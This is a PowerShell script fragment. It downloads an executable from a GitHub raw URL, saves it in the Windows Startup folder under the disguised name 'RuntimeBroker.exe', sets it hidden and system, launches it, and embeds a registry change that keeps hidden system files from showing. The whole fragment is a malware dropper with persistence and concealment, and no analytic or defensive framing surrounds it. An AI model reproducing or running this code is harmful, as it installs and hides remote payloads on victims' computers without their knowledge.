...
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/vibha000x7/ViaProxy-3.3.3-Java8/refs/heads/main/test.exe' -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.exe"
...
attrib +s +h "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.exe"
Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.exe"
$psScriptContent = @'
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "ShowSuperHidden" -Value 0
'@
